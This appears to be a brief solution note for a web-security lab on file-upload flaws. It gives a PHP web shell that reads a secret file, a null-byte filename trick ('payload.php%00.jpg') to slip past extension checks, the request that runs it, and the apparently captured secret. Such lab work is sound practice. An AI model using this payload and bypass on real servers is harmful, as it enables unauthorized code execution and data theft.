<?php echo file_get_contents('/home/carlos/secret'); ?>
/*
null byte characters in names change the way server recognises the end of the file

POST header
Content-Disposition: form-data; name="avatar"; filename="payload.php%00.jpg"

GET header
GET /files/avatars/payload.php HTTP/2
1pOZZm5WfhcCoSqqnptF6bVZhm5eCLrO
*/